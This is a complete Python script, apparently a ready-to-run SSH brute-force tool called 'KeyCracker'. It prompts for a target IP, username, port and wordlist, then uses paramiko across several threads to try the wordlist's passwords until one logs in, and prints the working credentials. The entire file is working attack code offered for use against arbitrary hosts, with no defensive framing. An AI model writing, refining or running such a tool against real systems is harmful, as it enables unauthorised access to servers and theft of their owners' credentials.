import paramiko
import threading
import time
from queue import Queue
from paramiko.ssh_exception import SSHException

success = False
queue = Queue()
lock = threading.Lock()

def show_logo():
    logo = r"""
      _  __           ____                _             
     | |/ /___ _   _ / ___|_ __ __ _  ___| | _____ _ __ 
     | ' // _ \ | | | |   | '__/ _` |/ __| |/ / _ \ '__|
     | . \  __/ |_| | |___| | | (_| | (__|   <  __/ |   
     |_|\_\___|\__, |\____|_|  \__,_|\___|_|\_\___|_|   
               |___/                                    

      Advanced SSH Brute Forcing Tool
                   Made by davycipher
    """
    print(logo)

def try_login(ip, port, user, password):
    global success
    if success:
        return
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=port, username=user, password=password, timeout=5)
        with lock:
            print(f"[SUCCESS] Username: {user} | Password: {password}")
            success = True
    except SSHException:
        pass
    except Exception as e:
        with lock:
            print(f"[ERROR] {e}")
    finally:
        ssh.close()

def worker(ip, port, user):
    while not queue.empty() and not success:
        password = queue.get().strip()
        try_login(ip, port, user, password)
        time.sleep(0.1)

def brute_force(ip, user, wordlist, port=22, threads=5):
    global success

    print(f"[INFO] Target: {ip}:{port}")
    with open(wordlist, 'r') as f:
        for line in f:
            queue.put(line)

    print("[INFO] Starting brute force attack...")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(ip, port, user))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    if not success:
        print("[FAILED] Could not find valid credentials.")
    else:
        print("[INFO] Attack completed successfully.")

if __name__ == '__main__':
    show_logo()
    ip = input("Enter the IP address to brute force: ")
    user = input("Enter the username for the target system: ")
    wordlist = input("Enter the path to the wordlist: ")
    port = input("Enter the SSH port (default 22): ")

    try:
        port = int(port) if port else 22
    except ValueError:
        print("[ERROR] Invalid port number. Using default port 22.")
        port = 22

    threads = input("Enter the number of threads (default 5): ")
    try:
        threads = int(threads) if threads else 5
    except ValueError:
        print("[ERROR] Invalid thread count. Using default 5.")
        threads = 5

    brute_force(ip, user, wordlist, port, threads)
